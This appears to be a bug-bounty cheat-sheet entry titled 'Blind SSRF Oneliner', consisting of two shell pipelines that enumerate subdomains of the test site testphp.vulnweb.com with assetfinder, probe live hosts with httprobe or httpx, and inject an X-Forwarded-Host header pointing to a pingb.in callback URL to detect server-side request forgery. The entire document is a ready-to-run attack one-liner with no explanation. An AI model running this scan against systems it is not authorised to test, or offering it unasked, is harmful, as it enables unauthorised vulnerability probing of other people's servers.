# Blind SSRF Oneliner:

echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done

echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done
